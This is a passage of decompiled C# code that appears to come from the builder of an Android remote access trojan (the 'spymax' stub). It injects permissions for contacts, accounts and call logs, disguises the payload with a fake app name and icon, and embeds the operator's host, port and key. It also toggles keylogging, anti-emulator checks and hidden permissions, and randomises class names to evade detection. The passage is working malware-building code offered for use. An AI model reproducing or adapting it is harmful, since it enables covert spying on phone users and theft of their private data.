											}
											break;
										}
										case 13:
										{
											char c = text9[5];
											if (c != 'A')
											{
												if (c == 'C')
												{
													if (text9 == "Read Contacts")
													{
														this.Prim_readcontact = "android.permission.READ_CONTACTS";
														text6 += "    <uses-permission android:name=\"android.permission.READ_CONTACTS\"  />\r\n";
													}
												}
											}
											else if (text9 == "Read Accounts")
											{
												this.Prim_readacounts = "android.permission.GET_ACCOUNTS";
												text6 += "    <uses-permission android:name=\"android.permission.GET_ACCOUNTS\"  />\r\n";
											}
											break;
										}
										case 14:
											if (text9 == "Read Call Logs")
											{
												this.Prim_calllog = "android.permission.READ_CALL_LOG";
												text6 += "    <uses-permission android:name=\"android.permission.READ_CALL_LOG\"  />\r\n";
											}
											break;
										case 16:
											if (text9 == "Change Wallpaper")
											{
												this.Prim_wallpaper = "android.permission.SET_WALLPAPER";
												text6 += "    <uses-permission android:name=\"android.permission.SET_WALLPAPER\" />\r\n";
											}
											break;
										}
									}
								}
								catch (Exception)
								{
								}
							}
						}
						string text10 = File.ReadAllText(path4).Replace(Resources.Toreplaceprim, text6).Replace(Resources.HIDECODE, Resources.SDK29);
						if (text10.Contains("suffix"))
						{
							text10 = text10.Replace("suffix", this.flavor).Replace("spymax", this.pack1).Replace("stub7", this.pack2).Replace("ClassGen0", this.NClassGen0).Replace(Resources.HIDECODE, Resources.SDK29).Replace("ClassGen1", this.NClassGen1).Replace("ClassGen2", this.NClassGen2).Replace("ClassGen3", this.NClassGen3).Replace("ClassGen4", this.NClassGen4).Replace("ClassGen5", this.NClassGen5).Replace("ClassGen6", this.NClassGen6).Replace("ClassGen8", this.NClassGen8).Replace("ClassGen9", this.NClassGen9).Replace("ClassGen10", this.NClassGen10).Replace("ClassGen11", this.NClassGen11).Replace("ClassGen12", this.NClassGen12).Replace("ClassGen13", this.NClassGen13).Replace("activz", this.Nactivz).Replace("servziz", this.Nservziz).Replace("tolziz", this.Ntolziz).Replace("brodatz", this.Nbrodatz).Replace("ClassGen14", this.NClassGen14).Replace("RequestBattery", this.NRequestBattery).Replace("RequestDraw", this.NRequestDraw).Replace("_sc_fb_", this.N_sc_fb_).Replace("_news_g_", this.N_news_g_).Replace("_strt_view_", this.N_strt_view_).Replace("HandelScreenCap", this.NHandelScreenCap).Replace("RequestAccess", this.NRequestAccess).Replace("StartScreenCap", this.NStartScreenCap).Replace("_trns_g_", this.N_trns_g_).Replace("RequestPermissions", this.NRequestPermissions).Replace("_engine_wrk_", this.N_engine_wrk_).Replace("_skin_cls_", this.N_skin_cls_).Replace("_update_app_", this.N_update_app_).Replace("_callr_lsnr_", this.N_callr_lsnr_).Replace("CommandsService", this.NCommandsService).Replace("j1j2j3j4j5j6", this.NresoString0).Replace("c1c2c3c4c5c6", this.NresoString1).Replace("z1z2z3z4z5z6", this.NresoString2).Replace("f1f2f3f4f5f6", this.NresoString3).Replace("h1h2h3h4h5h6", this.NresoString4).Replace("t1t2t3t4t5t6", this.NresoString5).Replace("n1n2n3n4n5n6", this.NresoString6).Replace("i1i2i3i4i5i6", this.NresoString7).Replace("k1k2k3k4k5k6", this.NresoString8).Replace("o1o2o3o4o5o6", this.NresoString9).Replace("u1u2u3u4u5u6", this.NresoString10).Replace("e1e2e3e4e5e6", this.NresoString11).Replace("y1y2y3y4y5y6", this.NresoString12).Replace("b1b2b3b4b5b6", this.Napp_reso0).Replace("d1d2d3d4d5d6", this.Ndraw_ico).Replace("x1x2x3x4x5x6", this.Ndraw_notifi).Replace("q1q2q3q4q5q6", this.NwebXML).Replace("skin.name", this.FAKEAPPNAME).Replace("trg.trgtapp.trg", this.TheTarget).Replace("[delayacess]", this.delayaccesstext.Text).Replace("RANDOM_STR1", this.RandommClass(100, 150)).Replace("RANDOM_STR2", this.RandommClass(100, 150)).Replace("RANDOM_STR3", this.RandommClass(100, 150)).Replace("_randomS", this.RandommClass(150, 200)).Replace("_shit_", this.RandommClass(150, 200)).Replace(Resources.HIDECODE, Resources.SDK29).Replace(Resources.Toreplaceprim, text6).Replace("s1s2s3s4s5s6", this.NnotifiXML);
							File.WriteAllText(path4, text10);
						}
						this.vulTrack = 70;
						string text11;
						for (;;)
						{
							text11 = this.folder_apktool + "\\temp\\res\\drawable\\x1x2x3x4x5x6.png";
							if (File.Exists(text11))
							{
								break;
							}
							Thread.Sleep(this._Time);
						}
						MyProject.Computer.FileSystem.RenameFile(text11, this.Ndraw_notifi + ".png");
						if (Operators.CompareString(this.iconPatch, "null", false) != 0)
						{
							if (File.Exists(this.iconPatch))
							{
								string path11;
								for (;;)
								{
									Thread.Sleep(this._Time);
									path11 = this.folder_apktool + "\\temp\\res\\drawable\\d1d2d3d4d5d6.png";
									string text12 = this.folder_apktool + "\\temp\\res\\drawable\\skinicon.png";
									try
									{
										if (Operators.CompareString(this.FAKEAPPicon, "null", false) != 0)
										{
											if (File.Exists(text12))
											{
												File.Delete(text12);
											}
											File.Copy(this.FAKEAPPicon, text12);
										}
										goto IL_FD5;
									}
									catch (Exception)
									{
										goto IL_FD5;
									}
									IL_FC8:
									Thread.Sleep(this._Time);
									continue;
									IL_FD5:
									if (File.Exists(path11))
									{
										break;
									}
									goto IL_FC8;
								}
								File.Delete(path11);
								Image image = Codes.ResizeImage(Image.FromFile(this.iconPatch), new Size(144, 144), false);
								image.Save(this.folder_apktool + "\\temp\\res\\drawable\\" + this.Ndraw_ico + ".png");
							}
						}
						else
						{
							string text13;
							for (;;)
							{
								text13 = this.folder_apktool + "\\temp\\res\\drawable\\d1d2d3d4d5d6.png";
								if (File.Exists(text13))
								{
									break;
								}
								Thread.Sleep(this._Time);
							}
							MyProject.Computer.FileSystem.RenameFile(text13, this.Ndraw_ico + ".png");
						}
						if (Operators.CompareString(this.BIND_Path, "null", false) != 0)
						{
							if (File.Exists(this.BIND_Path))
							{
								string path12;
								for (;;)
								{
									Thread.Sleep(this._Time);
									path12 = this.folder_apktool + "\\temp\\res\\raw\\b1b2b3b4b5b6";
									if (File.Exists(path12))
									{
										break;
									}
									Thread.Sleep(this._Time);
								}
								File.Delete(path12);
								File.Copy(this.BIND_Path, this.folder_apktool + "\\temp\\res\\raw\\" + this.Napp_reso0, true);
							}
						}
						else
						{
							string text14;
							for (;;)
							{
								text14 = this.folder_apktool + "\\temp\\res\\raw\\b1b2b3b4b5b6";
								if (File.Exists(text14))
								{
									break;
								}
								Thread.Sleep(this._Time);
							}
							MyProject.Computer.FileSystem.RenameFile(text14, this.Napp_reso0);
						}
						for (;;)
						{
							try
							{
								string text15;
								for (;;)
								{
									text15 = this.folder_apktool + "\\temp\\smali\\spymax\\stub7";
									if (Directory.Exists(text15))
									{
										break;
									}
									Thread.Sleep(this._Time);
								}
								int num2 = 1;
								do
								{
									string text16 = this.RandommMadv2(10, 15);
									File.WriteAllText(text15 + "\\" + text16 + ".smali", text.Replace("spymax", this.pack1).Replace("stub7", this.pack2).Replace("[MYNAME]", text16));
									num2++;
								}
								while (num2 <= 10);
								DirectoryInfo directoryInfo = new DirectoryInfo(text15);
								FileInfo[] files = directoryInfo.GetFiles("*.smali");
								this.LogB("Encryption Started\r\n---------");
								FileInfo[] array = files;
								foreach (FileInfo fileInfo in array)
								{
									string text17 = File.ReadAllText(fileInfo.FullName);
									string contents8 = (Operators.CompareString(fileInfo.Name.ToLower(), "buildconfig.smali", false) != 0) ? text17.Replace("spymax", this.pack1).Replace("stub7", this.pack2).Replace("ClassGen0", this.NClassGen0).Replace("ClassGen1", this.NClassGen1).Replace("ClassGen2", this.NClassGen2).Replace("ClassGen3", this.NClassGen3).Replace("ClassGen4", this.NClassGen4).Replace("ClassGen5", this.NClassGen5).Replace("ClassGen6", this.NClassGen6).Replace("ClassGen8", this.NClassGen8).Replace("ClassGen9", this.NClassGen9).Replace("ClassGen10", this.NClassGen10).Replace("ClassGen11", this.NClassGen11).Replace("ClassGen12", this.NClassGen12).Replace("ClassGen13", this.NClassGen13).Replace("ClassGen14", this.NClassGen14).Replace("activz", this.Nactivz).Replace("servziz", this.Nservziz).Replace("tolziz", this.Ntolziz).Replace("brodatz", this.Nbrodatz).Replace("RequestBattery", this.NRequestBattery).Replace("RequestDraw", this.NRequestDraw).Replace("_sc_fb_", this.N_sc_fb_).Replace("_news_g_", this.N_news_g_).Replace("_strt_view_", this.N_strt_view_).Replace("HandelScreenCap", this.NHandelScreenCap).Replace("RequestAccess", this.NRequestAccess).Replace("StartScreenCap", this.NStartScreenCap).Replace("_trns_g_", this.N_trns_g_).Replace("RequestPermissions", this.NRequestPermissions).Replace("_engine_wrk_", this.N_engine_wrk_).Replace("_skin_cls_", this.N_skin_cls_).Replace("_update_app_", this.N_update_app_).Replace("_callr_lsnr_", this.N_callr_lsnr_).Replace("_clss_loder_", this.N_clss_loder_).Replace("_excut_meth_", this.N_excut_meth_).Replace("_run_comnd_", this.N_run_comnd_).Replace("_get_me_fil_", this.N_get_me_fil_).Replace("CommandsService", this.NCommandsService).Replace("j1j2j3j4j5j6", this.NresoString0).Replace("c1c2c3c4c5c6", this.NresoString1).Replace("z1z2z3z4z5z6", this.NresoString2).Replace("f1f2f3f4f5f6", this.NresoString3).Replace("h1h2h3h4h5h6", this.NresoString4).Replace("t1t2t3t4t5t6", this.NresoString5).Replace("n1n2n3n4n5n6", this.NresoString6).Replace("i1i2i3i4i5i6", this.NresoString7).Replace("k1k2k3k4k5k6", this.NresoString8).Replace("o1o2o3o4o5o6", this.NresoString9).Replace("u1u2u3u4u5u6", this.NresoString10).Replace("e1e2e3e4e5e6", this.NresoString11).Replace("y1y2y3y4y5y6", this.NresoString12).Replace("b1b2b3b4b5b6", this.Napp_reso0).Replace("suffix", this.flavor).Replace("d1d2d3d4d5d6", this.Ndraw_ico).Replace("x1x2x3x4x5x6", this.Ndraw_notifi).Replace("q1q2q3q4q5q6", this.NwebXML).Replace("s1s2s3s4s5s6", this.NnotifiXML).Replace("key.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.KEY))).Replace("host.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.ip))).Replace("port.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.ports))).Replace("[CYPHER_FUT0EX]", "==Acascvsrgbdsrthbsrhtrdtaefergs").Replace("[CYPHER_FUT1EX]", "==ACSDEWVareaergeafsv").Replace("[CYPHER_FUT2EX]", "==aadvsarsaerfaerAESVSEr").Replace("[CYPHER_VICTIM]", this.namevictim).Replace("[TYPE-HIDE]", this.THETYPE).Replace("skin.info", this.FAKEAPPlink).Replace("USE-SUPER", this.isuper).Replace("[US-UNINS]", this.anuninstall).Replace("[NO_OXA]", this.isAOX).Replace("USE-AUTOUL", this.isautounlock).Replace("USE-DATAUSAGE", this.isnetwork).Replace("USE-ONECAP", this.iscaponce).Replace("[NAME>LNK>ID!]", this.MonitorPack).Replace("[TRAK-IT]", this.trackerlist).Replace("USE-BIND", this.isBind).Replace("USE-SKIP", this.isskipreinstall).Replace("USE-SCREENON", this.iskeepscreen).Replace("USE-BLOCKP", this.isHideprims).Replace("USE-ADMIN", this.isadmin).Replace("USE-AUTOS", this.isautostart).Replace("[SS]", this.Prim_sendsms).Replace("[RC]", this.Prim_recordcalls).Replace("[SW]", this.Prim_wallpaper).Replace("[RS]", this.Prim_readsms).Replace("[RCG]", this.Prim_calllog).Replace("[CRC]", this.Prim_readcontact).Replace("[GA]", this.Prim_readacounts).Replace("[CA]", this.Prim_camera).Replace("[MC]", this.Prim_microphone).Replace("[LOC1]", this.Prim_loacation1).Replace("[LOC2]", this.Prim_loacation2).Replace("[LOC3]", this.Prim_loacation3).Replace("[CL]", this.Prim_callphone).Replace("USE-QUICK", this.isQuick).Replace("USE-DRAW", this.isDrawing).Replace("USE-NOTIFI", this.isnotifi).Replace("_isequel_mth_", "helpscanintnum").Replace("_exit_meth_", this.new_exit_mth).Replace("_wifipolc_meth_", this.new_wifipolc).Replace("_formtpakt_methd_", this.new_formatpacket).Replace("_DZIP_meth_", this.new_dzip).Replace("_Getbyte_meth_", this.new_getbyte).Replace("_D_BASE64_", this.new_base_mth).Replace("_getstr_meth_", this.new_getstr).Replace("_CZIP_meth_", this.new_czip).Replace("_inst_bnd_", this.new_inst).Replace("_strt_con_", this.new_strt_con_).Replace("[USE-REC]", this.UseRecorder).Replace("[com.app.instll", "com.appd.instll.load").Replace("_fist_inf_", this.new_fist_inf_).Replace("_new_con_", this.new_new_con_).Replace("trg.trgtapp.trg", this.TheTarget).Replace("_send_it_", this.new_send_it_).Replace("[delayacess]", this.delayaccesstext.Text).Replace("_Reblace_", this.new_Reblace_).Replace("_runn_srv_", this.new_runn_srv_).Replace("[off_keylog]", this.OFFKEYLOG).Replace("[NO_EMUALTOR]", this.ANTIEMO).Replace("_NOTIFI_TITLE_", this.NOTIFI_TITLE).Replace("_NOTIFI_MSG_", this.NOTIFI_MSG).Replace("_randomS_shit_", this.RandommClass(100, 200)).Replace("[RANDOM-STRING]", this.NEWRANDOM).Replace("[CYPHER_FUT3EX]", "0000") : text17.Replace("payload", this.payload).Replace("suffix", this.flavor).Replace("spymax", this.pack1).Replace("stub7", this.pack2).Replace("j1j2j3j4j5j6", this.NresoString0).Replace("c1c2c3c4c5c6", this.NresoString1).Replace("z1z2z3z4z5z6", this.NresoString2).Replace("f1f2f3f4f5f6", this.NresoString3).Replace("h1h2h3h4h5h6", this.NresoString4).Replace("t1t2t3t4t5t6", this.NresoString5).Replace("n1n2n3n4n5n6", this.NresoString6).Replace("i1i2i3i4i5i6", this.NresoString7).Replace("k1k2k3k4k5k6", this.NresoString8).Replace("o1o2o3o4o5o6", this.NresoString9).Replace("u1u2u3u4u5u6", this.NresoString10).Replace("e1e2e3e4e5e6", this.NresoString11).Replace("y1y2y3y4y5y6", this.NresoString12).Replace("b1b2b3b4b5b6", this.Napp_reso0).Replace("d1d2d3d4d5d6", this.Ndraw_ico).Replace("x1x2x3x4x5x6", this.Ndraw_notifi).Replace("q1q2q3q4q5q6", this.NwebXML).Replace("s1s2s3s4s5s6", this.NnotifiXML);
									File.WriteAllText(fileInfo.FullName, contents8);
								}
								break;
							}
							catch (Exception)
							{
								Thread.Sleep(this._Time);
							}
						}
						for (;;)
						{
							try
							{
								string text18;
								for (;;)
								{
									text18 = this.folder_apktool + "\\temp\\smali\\spymax\\stub7\\activz";
									if (Directory.Exists(text18))
									{
										break;
									}
									Thread.Sleep(this._Time);
								}
								int num3 = 1;
								do
								{
									string text19 = this.RandommMadv2(10, 15);
									File.WriteAllText(text18 + "\\" + text19 + ".smali", text.Replace("spymax", this.pack1).Replace("stub7", this.pack2).Replace("[MYNAME]", "activz/" + text19));
									num3++;
								}
								while (num3 <= 10);
								DirectoryInfo directoryInfo2 = new DirectoryInfo(text18);
								FileInfo[] files2 = directoryInfo2.GetFiles("*.smali");
								this.LogB("Phase 2\r\n---------");
								FileInfo[] array3 = files2;
								foreach (FileInfo fileInfo2 in array3)
								{
									string text20 = File.ReadAllText(fileInfo2.FullName);
									string contents8 = (Operators.CompareString(fileInfo2.Name.ToLower(), "buildconfig.smali", false) != 0) ? text20.Replace("spymax", this.pack1).Replace("stub7", this.pack2).Replace("ClassGen0", this.NClassGen0).Replace("ClassGen1", this.NClassGen1).Replace("ClassGen2", this.NClassGen2).Replace("ClassGen3", this.NClassGen3).Replace("ClassGen4", this.NClassGen4).Replace("ClassGen5", this.NClassGen5).Replace("ClassGen6", this.NClassGen6).Replace("ClassGen8", this.NClassGen8).Replace("ClassGen9", this.NClassGen9).Replace("activz", this.Nactivz).Replace("servziz", this.Nservziz).Replace("tolziz", this.Ntolziz).Replace("brodatz", this.Nbrodatz).Replace("ClassGen10", this.NClassGen10).Replace("ClassGen11", this.NClassGen11).Replace("ClassGen12", this.NClassGen12).Replace("ClassGen13", this.NClassGen13).Replace("ClassGen14", this.NClassGen14).Replace("RequestBattery", this.NRequestBattery).Replace("RequestDraw", this.NRequestDraw).Replace("_sc_fb_", this.N_sc_fb_).Replace("_news_g_", this.N_news_g_).Replace("_strt_view_", this.N_strt_view_).Replace("HandelScreenCap", this.NHandelScreenCap).Replace("RequestAccess", this.NRequestAccess).Replace("StartScreenCap", this.NStartScreenCap).Replace("_trns_g_", this.N_trns_g_).Replace("RequestPermissions", this.NRequestPermissions).Replace("_engine_wrk_", this.N_engine_wrk_).Replace("_skin_cls_", this.N_skin_cls_).Replace("_update_app_", this.N_update_app_).Replace("_callr_lsnr_", this.N_callr_lsnr_).Replace("_clss_loder_", this.N_clss_loder_).Replace("_excut_meth_", this.N_excut_meth_).Replace("_run_comnd_", this.N_run_comnd_).Replace("_get_me_fil_", this.N_get_me_fil_).Replace("CommandsService", this.NCommandsService).Replace("j1j2j3j4j5j6", this.NresoString0).Replace("c1c2c3c4c5c6", this.NresoString1).Replace("z1z2z3z4z5z6", this.NresoString2).Replace("f1f2f3f4f5f6", this.NresoString3).Replace("h1h2h3h4h5h6", this.NresoString4).Replace("t1t2t3t4t5t6", this.NresoString5).Replace("n1n2n3n4n5n6", this.NresoString6).Replace("i1i2i3i4i5i6", this.NresoString7).Replace("k1k2k3k4k5k6", this.NresoString8).Replace("o1o2o3o4o5o6", this.NresoString9).Replace("u1u2u3u4u5u6", this.NresoString10).Replace("e1e2e3e4e5e6", this.NresoString11).Replace("y1y2y3y4y5y6", this.NresoString12).Replace("b1b2b3b4b5b6", this.Napp_reso0).Replace("suffix", this.flavor).Replace("d1d2d3d4d5d6", this.Ndraw_ico).Replace("x1x2x3x4x5x6", this.Ndraw_notifi).Replace("q1q2q3q4q5q6", this.NwebXML).Replace("s1s2s3s4s5s6", this.NnotifiXML).Replace("key.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.KEY))).Replace("host.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.ip))).Replace("port.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.ports))).Replace("[CYPHER_FUT0EX]", "==Acascvsrgbdsrthbsrhtrdtaefergs").Replace("[CYPHER_FUT1EX]", "==ACSDEWVareaergeafsv").Replace("[CYPHER_FUT2EX]", "==aadvsarsaerfaerAESVSEr").Replace("[CYPHER_VICTIM]", this.namevictim).Replace("[TYPE-HIDE]", this.THETYPE).Replace("skin.info", this.FAKEAPPlink).Replace("USE-SUPER", this.isuper).Replace("[US-UNINS]", this.anuninstall).Replace("[NO_OXA]", this.isAOX).Replace("USE-AUTOUL", this.isautounlock).Replace("USE-DATAUSAGE", this.isnetwork).Replace("USE-ONECAP", this.iscaponce).Replace("[NAME>LNK>ID!]", this.MonitorPack).Replace("[TRAK-IT]", this.trackerlist).Replace("USE-BIND", this.isBind).Replace("USE-SKIP", this.isskipreinstall).Replace("USE-SCREENON", this.iskeepscreen).Replace("USE-BLOCKP", this.isHideprims).Replace("USE-ADMIN", this.isadmin).Replace("USE-AUTOS", this.isautostart).Replace("[SS]", this.Prim_sendsms).Replace("[RC]", this.Prim_recordcalls).Replace("[SW]", this.Prim_wallpaper).Replace("[RS]", this.Prim_readsms).Replace("[RCG]", this.Prim_calllog).Replace("[CRC]", this.Prim_readcontact).Replace("[GA]", this.Prim_readacounts).Replace("[CA]", this.Prim_camera).Replace("[MC]", this.Prim_microphone).Replace("[LOC1]", this.Prim_loacation1).Replace("[LOC2]", this.Prim_loacation2).Replace("[LOC3]", this.Prim_loacation3).Replace("[CL]", this.Prim_callphone).Replace("USE-QUICK", this.isQuick).Replace("USE-DRAW", this.isDrawing).Replace("USE-NOTIFI", this.isnotifi).Replace("_isequel_mth_", "helpscanintnum").Replace("_exit_meth_", this.new_exit_mth).Replace("_wifipolc_meth_", this.new_wifipolc).Replace("_formtpakt_methd_", this.new_formatpacket).Replace("_DZIP_meth_", this.new_dzip).Replace("_Getbyte_meth_", this.new_getbyte).Replace("_D_BASE64_", this.new_base_mth).Replace("_getstr_meth_", this.new_getstr).Replace("_CZIP_meth_", this.new_czip).Replace("_inst_bnd_", this.new_inst).Replace("_strt_con_", this.new_strt_con_).Replace("[USE-REC]", this.UseRecorder).Replace("[com.app.instll", "com.appd.instll.load").Replace("_fist_inf_", this.new_fist_inf_).Replace("_new_con_", this.new_new_con_).Replace("trg.trgtapp.trg", this.TheTarget).Replace("[delayacess]", this.delayaccesstext.Text).Replace("_send_it_", this.new_send_it_).Replace("_Reblace_", this.new_Reblace_).Replace("_runn_srv_", this.new_runn_srv_).Replace("[off_keylog]", this.OFFKEYLOG).Replace("[NO_EMUALTOR]", this.ANTIEMO).Replace("_NOTIFI_TITLE_", this.NOTIFI_TITLE).Replace("_NOTIFI_MSG_", this.NOTIFI_MSG).Replace("_randomS_shit_", this.RandommClass(100, 200)).Replace("[RANDOM-STRING]", this.NEWRANDOM).Replace("[CYPHER_FUT3EX]", "0000") : text20.Replace("payload", this.payload).Replace("suffix", this.flavor).Replace("spymax", this.pack1).Replace("stub7", this.pack2).Replace("j1j2j3j4j5j6", this.NresoString0).Replace("c1c2c3c4c5c6", this.NresoString1).Replace("z1z2z3z4z5z6", this.NresoString2).Replace("f1f2f3f4f5f6", this.NresoString3).Replace("h1h2h3h4h5h6", this.NresoString4).Replace("t1t2t3t4t5t6", this.NresoString5).Replace("n1n2n3n4n5n6", this.NresoString6).Replace("i1i2i3i4i5i6", this.NresoString7).Replace("activz", this.Nactivz).Replace("servziz", this.Nservziz).Replace("tolziz", this.Ntolziz).Replace("brodatz", this.Nbrodatz).Replace("k1k2k3k4k5k6", this.NresoString8).Replace("o1o2o3o4o5o6", this.NresoString9).Replace("u1u2u3u4u5u6", this.NresoString10).Replace("e1e2e3e4e5e6", this.NresoString11).Replace("y1y2y3y4y5y6", this.NresoString12).Replace("b1b2b3b4b5b6", this.Napp_reso0).Replace("d1d2d3d4d5d6", this.Ndraw_ico).Replace("x1x2x3x4x5x6", this.Ndraw_notifi).Replace("q1q2q3q4q5q6", this.NwebXML).Replace("s1s2s3s4s5s6", this.NnotifiXML);
									File.WriteAllText(fileInfo2.FullName, contents8);
								}
								break;
							}
							catch (Exception)
							{
								Thread.Sleep(this._Time);
							}
						}
						for (;;)
						{
							try
							{
								string text21;
								for (;;)
								{
									text21 = this.folder_apktool + "\\temp\\smali\\spymax\\stub7\\activz\\brodatz";
									if (Directory.Exists(text21))
									{
										break;
									}
									Thread.Sleep(this._Time);
								}
								int num4 = 1;
								do
								{
									string text22 = this.RandommMadv2(10, 15);
									File.WriteAllText(text21 + "\\" + text22 + ".smali", text.Replace("spymax", this.pack1).Replace("stub7", this.pack2).Replace("[MYNAME]", "activz/brodatz/" + text22));
									num4++;
								}
								while (num4 <= 10);
								DirectoryInfo directoryInfo3 = new DirectoryInfo(text21);
								FileInfo[] files3 = directoryInfo3.GetFiles("*.smali");
								this.LogB("Phase 3\r\n---------");
								FileInfo[] array5 = files3;
								foreach (FileInfo fileInfo3 in array5)
								{
									string text23 = File.ReadAllText(fileInfo3.FullName);
									string contents8 = (Operators.CompareString(fileInfo3.Name.ToLower(), "buildconfig.smali", false) != 0) ? text23.Replace("spymax", this.pack1).Replace("stub7", this.pack2).Replace("ClassGen0", this.NClassGen0).Replace("ClassGen1", this.NClassGen1).Replace("ClassGen2", this.NClassGen2).Replace("ClassGen3", this.NClassGen3).Replace("ClassGen4", this.NClassGen4).Replace("ClassGen5", this.NClassGen5).Replace("ClassGen6", this.NClassGen6).Replace("ClassGen8", this.NClassGen8).Replace("ClassGen9", this.NClassGen9).Replace("ClassGen10", this.NClassGen10).Replace("ClassGen11", this.NClassGen11).Replace("ClassGen12", this.NClassGen12).Replace("ClassGen13", this.NClassGen13).Replace("ClassGen14", this.NClassGen14).Replace("activz", this.Nactivz).Replace("servziz", this.Nservziz).Replace("tolziz", this.Ntolziz).Replace("brodatz", this.Nbrodatz).Replace("RequestBattery", this.NRequestBattery).Replace("RequestDraw", this.NRequestDraw).Replace("_sc_fb_", this.N_sc_fb_).Replace("_news_g_", this.N_news_g_).Replace("_strt_view_", this.N_strt_view_).Replace("HandelScreenCap", this.NHandelScreenCap).Replace("RequestAccess", this.NRequestAccess).Replace("StartScreenCap", this.NStartScreenCap).Replace("_trns_g_", this.N_trns_g_).Replace("RequestPermissions", this.NRequestPermissions).Replace("_engine_wrk_", this.N_engine_wrk_).Replace("_skin_cls_", this.N_skin_cls_).Replace("_update_app_", this.N_update_app_).Replace("_callr_lsnr_", this.N_callr_lsnr_).Replace("_clss_loder_", this.N_clss_loder_).Replace("_excut_meth_", this.N_excut_meth_).Replace("_run_comnd_", this.N_run_comnd_).Replace("_get_me_fil_", this.N_get_me_fil_).Replace("CommandsService", this.NCommandsService).Replace("j1j2j3j4j5j6", this.NresoString0).Replace("c1c2c3c4c5c6", this.NresoString1).Replace("z1z2z3z4z5z6", this.NresoString2).Replace("f1f2f3f4f5f6", this.NresoString3).Replace("h1h2h3h4h5h6", this.NresoString4).Replace("t1t2t3t4t5t6", this.NresoString5).Replace("n1n2n3n4n5n6", this.NresoString6).Replace("i1i2i3i4i5i6", this.NresoString7).Replace("k1k2k3k4k5k6", this.NresoString8).Replace("o1o2o3o4o5o6", this.NresoString9).Replace("u1u2u3u4u5u6", this.NresoString10).Replace("e1e2e3e4e5e6", this.NresoString11).Replace("y1y2y3y4y5y6", this.NresoString12).Replace("b1b2b3b4b5b6", this.Napp_reso0).Replace("suffix", this.flavor).Replace("d1d2d3d4d5d6", this.Ndraw_ico).Replace("x1x2x3x4x5x6", this.Ndraw_notifi).Replace("q1q2q3q4q5q6", this.NwebXML).Replace("s1s2s3s4s5s6", this.NnotifiXML).Replace("key.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.KEY))).Replace("host.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.ip))).Replace("port.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.ports))).Replace("[CYPHER_FUT0EX]", "==Acascvsrgbdsrthbsrhtrdtaefergs").Replace("[CYPHER_FUT1EX]", "==ACSDEWVareaergeafsv").Replace("[CYPHER_FUT2EX]", "==aadvsarsaerfaerAESVSEr").Replace("[CYPHER_VICTIM]", this.namevictim).Replace("[TYPE-HIDE]", this.THETYPE).Replace("skin.info", this.FAKEAPPlink).Replace("USE-SUPER", this.isuper).Replace("[US-UNINS]", this.anuninstall).Replace("[NO_OXA]", this.isAOX).Replace("USE-AUTOUL", this.isautounlock).Replace("USE-DATAUSAGE", this.isnetwork).Replace("USE-ONECAP", this.iscaponce).Replace("[NAME>LNK>ID!]", this.MonitorPack).Replace("[TRAK-IT]", this.trackerlist).Replace("USE-BIND", this.isBind).Replace("USE-SKIP", this.isskipreinstall).Replace("USE-SCREENON", this.iskeepscreen).Replace("USE-BLOCKP", this.isHideprims).Replace("USE-ADMIN", this.isadmin).Replace("USE-AUTOS", this.isautostart).Replace("[SS]", this.Prim_sendsms).Replace("[RC]", this.Prim_recordcalls).Replace("[SW]", this.Prim_wallpaper).Replace("[RS]", this.Prim_readsms).Replace("[RCG]", this.Prim_calllog).Replace("[CRC]", this.Prim_readcontact).Replace("[GA]", this.Prim_readacounts).Replace("[CA]", this.Prim_camera).Replace("[MC]", this.Prim_microphone).Replace("[LOC1]", this.Prim_loacation1).Replace("[LOC2]", this.Prim_loacation2).Replace("[LOC3]", this.Prim_loacation3).Replace("[CL]", this.Prim_callphone).Replace("USE-QUICK", this.isQuick).Replace("USE-DRAW", this.isDrawing).Replace("USE-NOTIFI", this.isnotifi).Replace("_isequel_mth_", "helpscanintnum").Replace("_exit_meth_", this.new_exit_mth).Replace("_wifipolc_meth_", this.new_wifipolc).Replace("_formtpakt_methd_", this.new_formatpacket).Replace("_DZIP_meth_", this.new_dzip).Replace("_Getbyte_meth_", this.new_getbyte).Replace("_D_BASE64_", this.new_base_mth).Replace("_getstr_meth_", this.new_getstr).Replace("_CZIP_meth_", this.new_czip).Replace("_inst_bnd_", this.new_inst).Replace("_strt_con_", this.new_strt_con_).Replace("[USE-REC]", this.UseRecorder).Replace("[com.app.instll", "com.appd.instll.load").Replace("_fist_inf_", this.new_fist_inf_).Replace("_new_con_", this.new_new_con_).Replace("trg.trgtapp.trg", this.TheTarget).Replace("_send_it_", this.new_send_it_).Replace("[delayacess]", this.delayaccesstext.Text).Replace("_Reblace_", this.new_Reblace_).Replace("_runn_srv_", this.new_runn_srv_).Replace("[off_keylog]", this.OFFKEYLOG).Replace("[NO_EMUALTOR]", this.ANTIEMO).Replace("_NOTIFI_TITLE_", this.NOTIFI_TITLE).Replace("_NOTIFI_MSG_", this.NOTIFI_MSG).Replace("_randomS_shit_", this.RandommClass(100, 200)).Replace("[RANDOM-STRING]", this.NEWRANDOM).Replace("[CYPHER_FUT3EX]", "0000") : text23.Replace("payload", this.payload).Replace("suffix", this.flavor).Replace("spymax", this.pack1).Replace("stub7", this.pack2).Replace("j1j2j3j4j5j6", this.NresoString0).Replace("c1c2c3c4c5c6", this.NresoString1).Replace("z1z2z3z4z5z6", this.NresoString2).Replace("f1f2f3f4f5f6", this.NresoString3).Replace("h1h2h3h4h5h6", this.NresoString4).Replace("t1t2t3t4t5t6", this.NresoString5).Replace("n1n2n3n4n5n6", this.NresoString6).Replace("i1i2i3i4i5i6", this.NresoString7).Replace("k1k2k3k4k5k6", this.NresoString8).Replace("o1o2o3o4o5o6", this.NresoString9).Replace("u1u2u3u4u5u6", this.NresoString10).Replace("e1e2e3e4e5e6", this.NresoString11).Replace("y1y2y3y4y5y6", this.NresoString12).Replace("b1b2b3b4b5b6", this.Napp_reso0).Replace("d1d2d3d4d5d6", this.Ndraw_ico).Replace("x1x2x3x4x5x6", this.Ndraw_notifi).Replace("q1q2q3q4q5q6", this.NwebXML).Replace("s1s2s3s4s5s6", this.NnotifiXML);
									File.WriteAllText(fileInfo3.FullName, contents8);
								}
								break;
							}
							catch (Exception)
							{
								Thread.Sleep(this._Time);
